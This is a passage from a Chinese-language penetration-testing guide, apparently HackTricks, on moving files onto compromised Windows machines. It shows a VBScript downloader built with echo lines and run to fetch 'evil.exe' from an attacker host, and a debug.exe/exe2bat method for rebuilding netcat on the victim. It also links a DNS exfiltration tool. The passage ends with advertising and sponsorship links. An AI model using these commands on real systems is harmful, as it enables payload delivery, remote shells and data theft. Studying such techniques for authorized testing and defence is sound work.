echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

这是一种适用于 Windows 32 位机器的疯狂技术。思路是使用 `debug.exe` 程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重新构建它们。所以我们的想法是，我们拿到二进制文件，比如 `netcat`。然后将其反汇编为十六进制，在受损的机器上将其粘贴到一个文件中，然后使用 `debug.exe` 进行汇编。

`Debug.exe` 只能汇编 64 kb。所以我们需要使用小于该大小的文件。我们可以使用 upx 进一步压缩它。所以让我们这样做：
```
upx -9 nc.exe
```
现在它只有29 kb。完美。现在让我们对其进行反汇编：
```
wine exe2bat.exe nc.exe nc.txt
```
现在我们只需将文本复制粘贴到我们的Windows shell中。它将自动创建一个名为nc.exe的文件

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
